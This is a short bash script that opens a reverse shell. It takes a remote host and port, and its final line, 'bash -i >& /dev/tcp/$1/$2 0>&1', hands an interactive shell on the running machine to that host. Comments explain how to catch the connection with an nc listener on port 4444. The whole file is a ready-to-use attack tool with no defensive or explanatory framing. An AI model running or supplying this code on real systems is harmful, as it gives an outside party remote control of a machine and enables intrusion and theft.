#!/bin/bash
# author: yulibao
# this script will bind a local shell to a remote listening

# remote listening may be like this: 
#   nc -lvvp 4444
# and connect to ir by:
# ./reverse.sh <remote_host> 4444

if [ ! "$1" ]; then
    echo "Error: no target address"
    exit 1
fi

if [ ! "$2" ]; then
    echo "Error: no target port"
    exit 1
fi

bash -i >& /dev/tcp/$1/$2 0>&1